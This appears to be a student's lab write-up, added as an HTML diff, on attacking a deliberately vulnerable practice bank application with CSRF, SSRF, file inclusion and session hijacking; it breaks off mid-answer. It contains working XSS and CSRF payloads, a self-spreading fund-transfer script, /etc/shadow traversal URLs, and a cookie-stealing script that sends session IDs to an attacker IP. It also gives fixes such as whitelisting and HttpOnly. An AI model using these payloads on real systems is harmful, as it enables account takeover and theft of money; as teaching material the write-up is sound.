@@ -1,0 +1,640 @@
+<h2 id="web-application-vulnerabilities--2">Web Application Vulnerabilities -2</h2>
+<h3 id="exercise-1-cross-site-request-forgery-csrfxsrf">Exercise 1: Cross Site Request Forgery (CSRF/XSRF)</h3>
+<h4 id="task-1">Task 1</h4>
+<p><strong>Q 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).</strong></p>
+<p><strong>Solution</strong></p>
+<ul>
+<li><p>Cross-site-request-forgery (CSRF)- is an attack where a malicious website exploits trust between the web browser and the authenticated user’s website that is vulnerable.</p></li>
+<li><p>Unauthorized requests or commands are executed on behalf of the victim on a vulnerable website.</p></li>
+<li><p>Assume a vulnerable website that allows executing commands (like funds transfer) containing a URL for that fund’s transfer. So when the user hits <code>transfer funds</code> with appropriate parameters, the request gets executed successfully.</p></li>
+<li><p>Steps involved:</p>
+<ul>
+<li>Setup a malicious website.</li>
+<li>Craft a script or source (like, <code>img</code> tags, <code>iframe</code>) that executes a request to transfer funds.</li>
+<li>Allow the authenticated victim to access the malicious website.</li>
+<li>Send the fund transfer request (Since the victim is authenticated and the URL/Script is crafted to transfer funds, cookies stored on the victim’s browser also be sent).</li>
+<li>Request is sent on behalf of malicious users so the request is executed successfully.</li>
+</ul></li>
+</ul>
+<h4 id="task-2">Task 2</h4>
+<p><strong>Q: What is the difference between XSS and CSRF/XSRF from their execution perspective?</strong><br />
+<strong>Solution:</strong> Both of these are client-side attacks. But, Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user. Where as Cross-site request forgery (or CSRF) allows an attacker to trick a victim user to perform actions that they do not intend to.</p>
+<h4 id="task-3">Task 3</h4>
+<p><strong>Q: Briefly explain why your bank is theoretically vulnerable to CSRF/XSRF attack!</strong><br />
+<strong>Solution:</strong> After examining the web request from the <code>Transfer Funds</code> page, the web application doesn’t send a unique identifier or token, that identifies the request being originated from the same domain or performed by an actual user.</p>
+<figure>
+<img src="images/task2/funds_transfer.PNG" alt="funds_transfer" /><figcaption aria-hidden="true">funds_transfer</figcaption>
+</figure>
+<h4 id="task-4">Task 4</h4>
+<p><strong>Assume that you are a valid customer of your bank. Show how you can use XSRF to transfer money from another account to your account.</strong> <strong>Solution:</strong> - In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF. - Run the Python HTTP server, where <code>error.html</code> is located.</p>
+<pre><code>```bash
+    python -m SimpleHTTPServer 81
+```
+
+```html
+&lt;html&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        const queryString = window.location.search;
+        console.log(queryString);
+        const urlParams = new URLSearchParams(queryString);
+        const accountNo = urlParams.get(&#39;x&#39;);
+
+        function getURL() {
+
+            const url = &quot;http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=&quot; + accountNo + &quot;&amp;dstbank=41131337&amp;dstacc=14314312&amp;amount=1.95&amp;remark=&amp;htbtransfer=Transfer&quot;;
+            http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=173105291&amp;dstbank=41131337&amp;dstacc=11111111&amp;amount=1&amp;remark=&amp;htbtransfer=Transfer 
+            window.open(url, &quot;_blank&quot;);
+        }
+    &lt;/script&gt;
+    &lt;html&gt;
+    &lt;body&gt;
+        We are very sorry for the inconvenience, you had an error while during the last transaction, please click the
+        button bellow to claim your refund plus 1 cent gift.
+        &lt;button onclick=&quot;getURL()&quot;&gt; Proceed &lt;/button&gt;
+
+    &lt;/body&gt;
+
+    &lt;/html&gt;
+```</code></pre>
+<ul>
+<li><p>Three payloads were used due to the character limitations of the remark field.</p></li>
+<li><p>Navigate to Transfer Funds page and send the below three payloads in remark field to victim account from the attacker account.</p>
+<ul>
+<li>Payload 1</li>
+</ul>
+<div class="sourceCode" id="cb2"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>script<span class="op">&gt;</span><span class="kw">var</span> x <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementsByName</span>(<span class="st">&quot;account&quot;</span>)[<span class="dv">0</span>]<span class="op">.</span><span class="at">value</span><span class="op">&lt;/</span>script<span class="op">&gt;</span> </span></code></pre></div>
+<ul>
+<li>Payload 2</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>script<span class="op">&gt;</span><span class="kw">function</span> <span class="fu">y</span>(){<span class="bu">window</span><span class="op">.</span><span class="fu">open</span>(<span class="st">&quot;http://localhost:81/error.html?x=&quot;</span><span class="op">+</span>x<span class="op">,</span> <span class="st">&quot;_blank&quot;</span>)<span class="op">;</span>}<span class="op">&lt;/</span>script<span class="op">&gt;</span> </span></code></pre></div>
+<ul>
+<li>Payload 3</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>a onclick<span class="op">=</span><span class="st">&quot;y()&quot;</span><span class="op">&gt;</span><span class="bu">Error</span> please click here<span class="op">!!&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div></li>
+<li><p>Once the payloads are transferred victim can see an <code>Error please click here!!!</code> link in the remark field on the Account details page.</p></li>
+</ul>
+<!-- Todo image  -->
+<!-- Todo  -->
+<ul>
+<li>The page will be redirected to the <code>error.html</code> which is up and running.</li>
+</ul>
+<figure>
+<img src="images/task2/1.4.1.JPG" alt="Attacker_Website" /><figcaption aria-hidden="true">Attacker_Website</figcaption>
+</figure>
+<ul>
+<li>If the victim clicks on the ‘proceed’ button, the funds will be transferred to the attacker’s account, and the page is redirected to the bank web application.</li>
+</ul>
+<figure>
+<img src="images/task2/1.4.2.JPG" alt="Attack_Successful" /><figcaption aria-hidden="true">Attack_Successful</figcaption>
+</figure>
+<h4 id="task-5.">Task 5.</h4>
+<p><strong>Q: Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.</strong></p>
+<p><strong>solution</strong> - To perform this attack we have to make some assumptions to overcome some limitations. - The assumption is that a bank account number is an eight-digit number with the same number in every digit place like 11111111,22222222,33333333….,99999999. - Approaches and their limitations: - <strong>Approach 1:</strong> Bruteforce. to generate all account numbers and send the payload. - Limitation: Bruteforce is computationally costly. - <strong>Approach 2:</strong> Acquiring account number from the Account Details page. - Limitation: There might be a scenario where <code>Account A</code> has only <code>B</code>’s details on its account details page and <code>B</code> also has only <code>A</code>’s details in this case we are not able to spread the attack to other accounts.</p>
+<ul>
+<li><p>Because of these limitations for the demonstration of the attack, we made the assumption.</p></li>
+<li><p>To perform the attack please repeat the process explained in exercise 1.d replacing the cookie.html code with the code given below.</p></li>
+</ul>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;body&gt;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    bellow to claim your refund plus 1 cent gift.</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;button</span> <span class="er">onclick</span><span class="ot">=</span><span class="st">&quot;getURL()&quot;</span><span class="kw">&gt;</span> Proceed <span class="kw">&lt;/button&gt;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;div</span> <span class="er">style</span><span class="ot">=</span><span class="st">&quot;display:none&quot;</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;images&quot;</span><span class="kw">&gt;</span> <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/body&gt;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> queryString <span class="op">=</span> <span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span><span class="op">;</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(queryString)<span class="op">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> urlParams <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(queryString)<span class="op">;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> accountNo <span class="op">=</span> urlParams<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;x&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(accountNo)<span class="op">;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> allAccounts <span class="op">=</span> [<span class="dv">11111111</span><span class="op">,</span> <span class="dv">22222222</span><span class="op">,</span> <span class="dv">33333333</span><span class="op">,</span> <span class="dv">44444444</span><span class="op">,</span> <span class="dv">55555555</span><span class="op">,</span> <span class="dv">66666666</span><span class="op">,</span> <span class="dv">77777777</span><span class="op">,</span> <span class="dv">88888888</span><span class="op">,</span> <span class="dv">99999999</span>]<span class="op">;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">getURL</span>() {</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>        allAccounts<span class="op">.</span><span class="fu">forEach</span>(<span class="kw">function</span> (destAccount) {</span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (destAccount <span class="op">!=</span> accountNo) {</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>                <span class="kw">var</span> varName <span class="op">=</span> <span class="kw">new</span> <span class="fu">Image</span>()<span class="op">;</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>                varName<span class="op">.</span><span class="at">src</span> <span class="op">=</span> <span class="st">&quot;http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=&quot;</span> <span class="op">+</span> accountNo <span class="op">+</span> <span class="st">&quot;&amp;dstbank=41131337&amp;dstacc=&quot;</span> <span class="op">+</span> destAccount <span class="op">+</span> <span class="st">&quot;&amp;amount=1.1&amp;remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&amp;htbtransfer=Transfer&quot;</span><span class="op">;</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>                <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;images&#39;</span>)<span class="op">.</span><span class="fu">appendChild</span>(varName)<span class="op">;</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>                <span class="kw">var</span> funcName <span class="op">=</span> <span class="kw">new</span> <span class="fu">Image</span>()<span class="op">;</span></span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>                funcName<span class="op">.</span><span class="at">src</span> <span class="op">=</span> <span class="st">&quot;http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=&quot;</span> <span class="op">+</span> accountNo <span class="op">+</span> <span class="st">&quot;&amp;dstbank=41131337&amp;dstacc=&quot;</span> <span class="op">+</span> destAccount <span class="op">+</span> <span class="st">&quot;&amp;amount=1.2&amp;remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&amp;htbtransfer=Transfer&quot;</span><span class="op">;</span></span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>                <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;images&#39;</span>)<span class="op">.</span><span class="fu">appendChild</span>(funcName)<span class="op">;</span></span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>                <span class="kw">var</span> executeFunction <span class="op">=</span> <span class="kw">new</span> <span class="fu">Image</span>()<span class="op">;</span></span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>                executeFunction<span class="op">.</span><span class="at">src</span> <span class="op">=</span> <span class="st">&quot;http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=&quot;</span> <span class="op">+</span> accountNo <span class="op">+</span> <span class="st">&quot;&amp;dstbank=41131337&amp;dstacc=&quot;</span> <span class="op">+</span> destAccount <span class="op">+</span> <span class="st">&quot;&amp;amount=1.3&amp;remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&amp;htbtransfer=Transfer&quot;</span><span class="op">;</span></span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>                <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;images&#39;</span>)<span class="op">.</span><span class="fu">appendChild</span>(executeFunction)<span class="op">;</span></span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>        })<span class="op">;</span></span>
+<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> url <span class="op">=</span> <span class="st">&quot;http://localhost/htdocs/index.php?page=htbtransfer&amp;srcacc=&quot;</span> <span class="op">+</span> accountNo <span class="op">+</span> <span class="st">&quot;&amp;dstbank=41131337&amp;dstacc=14314312&amp;amount=1.95&amp;remark=&amp;htbtransfer=Transfer&quot;</span><span class="op">;</span></span>
+<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>        <span class="bu">window</span><span class="op">.</span><span class="fu">open</span>(url<span class="op">,</span> <span class="st">&quot;_blank&quot;</span>)<span class="op">;</span></span>
+<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+<ul>
+<li>When the victim clicks the <code>Error please click here!!!</code> link the attack will spread to all accounts on the bank server.</li>
+</ul>
+<img src="images/task2/1.5.JPG" alt="Automated_Attack" /> <br></br>
+<hr>
+</hr>
+<p><br></br></p>
+<h3 id="exercise-2-server-side-request-forgeryssrf">Exercise 2: Server-Side Request Forgery(SSRF)</h3>
+<p><strong>1. Briefly explain in your own words what is SSRF vulnerability and common SSRF attacks and what are the common SSRF defences circumventing</strong></p>
+<p><strong>Solution</strong> - <strong>SSRF(Server-side request forgery)</strong> is a web server vulnerability where an attacker tricks the server to execute a request. with a specially crafted request, one can control the vulnerable application itself or other back-end systems that the server can communicate with. The malicious URL usually crafted using a publicly accessible URL, thus giving partial or full control on server requests.</p>
+<ul>
+<li><p><strong>Common SSRF attacks</strong></p>
+<ul>
+<li>SSRF attacks can affect the server itself or the other backend systems that have a relation with the server.</li>
+<li>SSRF attacks against the server itself.</li>
+<li>In an SSRF attack against the server itself, the attacker tricks the application to make an HTTP request to the server itself via its loopback network interface.</li>
+<li>Consider an example where a user makes a <code>POST</code> request to fetch a product.</li>
+<li>the request looks like below</li>
+</ul>
+<div class="sourceCode" id="cb6"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    POST <span class="op">/</span>product<span class="op">/</span>stock HTTP<span class="op">/</span><span class="fl">1.0</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    Content<span class="op">-</span>Type<span class="op">:</span> application<span class="op">/</span>x<span class="op">-</span>www<span class="op">-</span>form<span class="op">-</span>urlencoded</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    Content<span class="op">-</span>Length<span class="op">:</span> <span class="dv">118</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>    stockApi<span class="op">=</span>http<span class="op">:</span><span class="co">//stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span></span></code></pre></div></li>
+<li><p>This can be manipulated to <code>POST /product/stock HTTP/1.0     Content-Type: application/x-www-form-urlencoded     Content-Length: 118     stockApi=http://localhost/admin</code></p></li>
+<li><p>Which returns the admin contents to the user.</p></li>
+<li><p>SSRF attacks against other back-end systems. This type of attack can be performed when the application vulnerable server can interact with other back-end systems that are not directly reachable by users.</p></li>
+<li><p>This attack can exploit by requesting <code>stockApi=http://192.164.1.22/admin</code></p></li>
+<li><p><strong>Common SSRF defenses:</strong></p>
+<ul>
+<li>blacklist-based input filters, The application should block the requests containing <code>localhost</code>, <code>127.0.0.1</code> or other sensitive keywords like <code>admin</code>.</li>
+<li>Whitelist-based input filters,by allowing input that matches, begins with, or contains.</li>
+<li>Whitelist domains in DNS.</li>
+<li>Do not send raw responses.</li>
+<li>Sanitize and validate inputs.</li>
+<li>Enable authentication on all services.</li>
+</ul></li>
+</ul>
+<p><strong>2. What is the difference between SSRF and CSRF/XSRF from their execution perspective?</strong></p>
+<p><strong>Solution:</strong> CSRF targets the user, to trick or executes malicious links/requests, and send them to the server on behalf of them, whereas SSRF involves specifically targeting the server, which is vulnerable in handling user requests. Although in both cases, the server is vulnerable, the victim is different in CSRF and SSRF attacks.</p>
+<h3 id="exercise-3-local-file-inclusion-lfi">Exercise 3: Local File Inclusion (LFI)</h3>
+<p><strong>1. Briefly explain what is a Local File Inclusion (LFI) vulnerability? By using a simple example, describe how do LFIs work and how to avoid this vulnerability? Show a vulnerable code and apply your patch to it.</strong></p>
+<p><strong>Solution:</strong> <strong>Local File Inclusion (LFI)</strong> is a web vulnerability, where an attacker tricks the web application to dynamically load files from the webserver that are available locally.</p>
+<p><em>Example:</em> When an application receives an unsanitized user input, and processed, which exposes local files because of the input that directly constructs the file path, which is included in a response.</p>
+<p><strong>sample vulnerable code</strong></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;File included: &quot;</span><span class="op">.</span><span class="va">$_REQUEST</span>[<span class="st">&quot;page&quot;</span>]<span class="op">.</span><span class="st">&quot;&lt;br&gt;&quot;</span><span class="ot">;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="ot">;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$local_file</span> <span class="op">=</span> <span class="va">$_REQUEST</span>[<span class="st">&quot;page&quot;</span>]<span class="ot">;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;Local file to be used: &quot;</span><span class="op">.</span> <span class="va">$local_file</span><span class="ot">;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;&lt;br&gt;&lt;br&gt;&quot;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span> <span class="va">$local_file</span><span class="ot">;</span></span></code></pre></div>
+<p>How it works:</p>
+<ul>
+<li>The application uses file path as an input.</li>
+<li>User input is treated as trusted and safe.</li>
+<li>A local file can be included as a result of user-specified input to the file include.</li>
+<li>Application returns the file contents as a response.</li>
+</ul>
+<p><strong>Avoiding the Vulnerability</strong> - ID assignation: Saving file paths in a database with an ID for every single one, this way user can only see the ID without viewing or altering the path. - Whitelisting: An application can allow verified and secured whitelist files and ignore other input or file names.</p>
+<ul>
+<li><p><strong>A vulnerable code</strong> <code>php      $local_file = $_REQUEST["page"];      include ($local_file. '.php')</code></p></li>
+<li><p><strong>Fix: Whitelisting file</strong> <code>php      $allowed_files = array('index','transfer','accounts'); //list of files that are allowed to be included       $local_file = $_REQUEST["page"];      if(in_array($local_file, $allowed_files)) { //check if the requested file is in allowed array list         include ($local_file. '.php')     }</code></p>
+<blockquote>
+<p>It is also best, that none of the allowed_files can be modified by attacker, epecially with file uploads where the attacker has control over file names.</p>
+</blockquote></li>
+</ul>
+<p><strong>2. How do you identify and exploit LFI? Describe it with a simple example.</strong></p>
+<ul>
+<li><p>Look for the page that includes file names or pages as URL parameters like, <code>javascript          http://www.vbank.com/file.php?file=transfer.php</code></p></li>
+<li><p>Change file by changing the file include or file path URL.</p></li>
+<li><p>Traverse through the directory to look for local files and observe the response from the application.</p></li>
+<li><p>Example.. <code>javascript         http://www.vbank.com/file.php?file=../etc/shadow  //does'nt work</code> <code>javascript         http://www.vbank.com/file.php?file=../../etc/shadow // does'nt work</code> <code>javascript         http://www.vbank.com/file.php?file=../../../etc/shadow // shows the shadow file</code></p></li>
+<li><p>If the file path is true and the application doesn’t filter and the file is available local to the server, contents can be displayed on the browser as a response.</p></li>
+<li><p>The lack of input validation and filtering for files allows reading file contents.</p></li>
+</ul>
+<p><strong>3. Briefly explain what is Remote File Inclusion (RFI) and how can you minimise the risk of RFI attacks? And LFI vs. RFI?</strong><br />
+<strong>Solution:</strong><br />
+- <strong>Remote File Inclusion (RFI)</strong> web vulnerability where arbitary input is allowed in file include request that dynamically refere external scripts. - If that input is not sanitized, that can lead to the execution of remote files from a remote URL located within a different domain. - In PHP, using the unsanitized input in functions like <code>include</code>,<code>include_once</code>, <code>require</code>, <code>require_once</code> lead to such vulnerabilities. - Typical Vulnerable code.</p>
+<pre><code>```php
+    echo &quot;File included is :&quot;. $_REQUEST[&quot;file&quot;].&quot;&lt;br&gt;&quot;;
+    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;
+    include $_REQUEST[&quot;file&quot;];
+```</code></pre>
+<ul>
+<li><strong>Minimizing risks:</strong>
+<ul>
+<li>Sanitize user-provided inputs in (GET/POST parameters, URL parameters and HTTP header values).</li>
+<li>Build a whitelist and allow request execution only with the requests with those files.</li>
+<li>For RFI to work, <code>allow_url_include</code> must be turned <code>On</code> in PHP configuration (located in <code>php.ini</code>). This can be turned <code>Off</code> to minimize the risk of fetching remote files. Usually on default installation this is turned <code>Off</code>.</li>
+</ul></li>
+<li><strong>LFI Vs RFI</strong>
+<ul>
+<li>LFI and RFI are almost similar, both the attacks result in the upload of malware to the server to gain unauthorized access to sensitive data. In the RFI the attacker uses remote files whereas in LFI local files are used to carry out the attack.</li>
+</ul></li>
+</ul>
+<h3 id="exercise-4-session-hijacking">Exercise 4: Session Hijacking</h3>
+<p><strong>1. Install a webserver on your machine. Use it to write a script that will read the information required to hijack a session. Briefly describe your script.</strong></p>
+<p><strong>Solution:</strong> - Installed Python and run the webserver module,</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>    <span class="ex">$</span> python3 <span class="at">-m</span> http.server</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Serving</span> HTTP on 0.0.0.0 port 8000 <span class="er">(</span><span class="ex">http://0.0.0.0:8000/</span><span class="kw">)</span></span></code></pre></div>
+<ul>
+<li><p>Initiate funds transfer with following remarks,</p></li>
+<li><p>Remarks in transfer 1:</p></li>
+</ul>
+<div class="sourceCode" id="cb10"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span><span class="kw">new</span> <span class="fu">Image</span>()<span class="op">.</span><span class="at">src</span><span class="op">=</span><span class="st">&quot;http://192.168.37.128:81/c=&quot;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<figure>
+<img src="images/task2/session_hijack_initiate_transfer.PNG" alt="session_hijack_initiate_transfer" /><figcaption aria-hidden="true">session_hijack_initiate_transfer</figcaption>
+</figure>
+<ul>
+<li><p>The above scripts automatically sends a <code>GET</code> request(whenn the victim page is loaded) to the attacker address.</p></li>
+<li><p>The request for the above script can be seen in attacker’s server logs, ```bash └─$ sudo python -m SimpleHTTPServer 81<br />
+Serving HTTP on 0.0.0.0 port 81 … 192.168.37.128 - - [23/May/2021 15:34:01] code 404, message File not found 192.168.37.128 - - [23/May/2021 15:34:01] “GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1” 404 - 192.168.37.128 - - [23/May/2021 15:35:07] code 404, message File not found 192.168.37.128 - - [23/May/2021 15:35:07] “GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1” 404 - 192.168.37.128 - - [23/May/2021 15:38:23] code 404, message File not found 192.168.37.128 - - [23/May/2021 15:38:23] “GET /c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1” 404 -</p>
+<p>```</p></li>
+<li><p>From the logs we can observe the request contents <code>USECURITYID=crblk95qe8b8mmdcva0saaj9m4</code> which we know that, is a cookie value.</p></li>
+</ul>
+<p><strong>2. Use the implementation from the last step to hijack the session of a customer of your bank. Briefly describe the steps to perform this attack.</strong></p>
+<p><strong>solution:</strong></p>
+<ul>
+<li><p>Copy the <code>USECURITYID=b35oqi84j4l16mecckl4lksf60</code>(another captured cookie) that is captured on the server log.</p></li>
+<li><p>Installed <code>EditThisCookie</code> extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en</p></li>
+<li><p>Open the login page of the application in a private window .</p></li>
+<li><p>Paste the cookie value, into the <code>Value</code> field. <img src="images/task2/edit_this_cookie.PNG" alt="edit_this_cookie" /></p></li>
+<li><p>Click on Green tick below the window.</p></li>
+<li><p>Reload the page.</p></li>
+<li><p>Should be logged in as a user.</p></li>
+<li><p><strong>Result</strong></p>
+<figure>
+<img src="images/task2/hijacked_session.PNG" alt="hijacked_session_alex" /><figcaption aria-hidden="true">hijacked_session_alex</figcaption>
+</figure></li>
+</ul>
+<p><strong>3. Which possible implementation mistakes enable your attack?</strong> <strong>Solution :</strong> 1. Application is vulnerable to XSS(unsanitized user input at <code>Remarks</code> field), thus leveraging it to steal cookies. 2. Cross-domain requests are possible(allowing it to send arequest to the attacker’s site), no <code>Same-Origin-Policy</code> is implemented. 3. No <code>HttpOnly</code> flag, as this tells the browser not to display access cookies through client-side scripts.</p>
+<p><strong>4. How would https influence it?</strong> <strong>Solution:</strong> <code>HTTPS</code> has no significant influence in this case, as the attacker can still access the cookie (as it is stored un-encrypted) and send it over to the attacker’s server. However, this would be beneficial if the attacker is in the same network as the user and try to steal cookies, as the data is sent encrypted. If cookies are sent in headers <code>secure</code> flag should be set, indicate to the browser that cookies can only be sent in <code>HTTPS</code> requests.</p>
+<p><strong>5. Implement some precautions which can prevent or mitigate this attack?</strong></p>
+<p><strong>Solution:</strong><br />
+1. Sanitize user input to avoid any injection into the application. - Vulnerable code:</p>
+<pre><code>```php
